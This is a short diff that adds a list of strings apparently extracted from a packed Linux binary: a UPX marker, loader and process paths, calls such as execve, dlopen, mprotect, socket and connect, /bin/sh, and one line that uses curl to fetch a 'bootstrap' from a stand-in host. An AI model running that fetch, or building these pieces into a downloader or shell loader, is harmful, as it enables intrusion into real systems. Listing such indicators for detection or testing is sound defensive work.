@@ -1,0 +1,11 @@
+.upx
+/lib64/ld-linux-x86-64.so.2
+/proc/self/exe
+execve
+dlopen
+dlsym
+mprotect
+/bin/sh
+curl http://example.invalid/bootstrap
+socket
+connect
